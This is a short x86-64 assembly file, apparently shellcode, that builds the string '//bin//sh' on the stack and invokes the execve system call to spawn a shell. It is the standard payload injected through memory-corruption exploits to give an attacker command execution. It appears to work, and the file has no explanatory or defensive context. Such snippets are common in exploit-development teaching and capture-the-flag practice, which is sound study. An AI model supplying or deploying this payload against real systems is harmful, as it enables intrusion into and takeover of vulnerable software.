; execve(["/bin/sh",], [], [])

bits 64
    push 0x68
    mov rax, 0x732f2f6e69622f2f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor r10, r10
    mov rax, 0x3b
    syscall
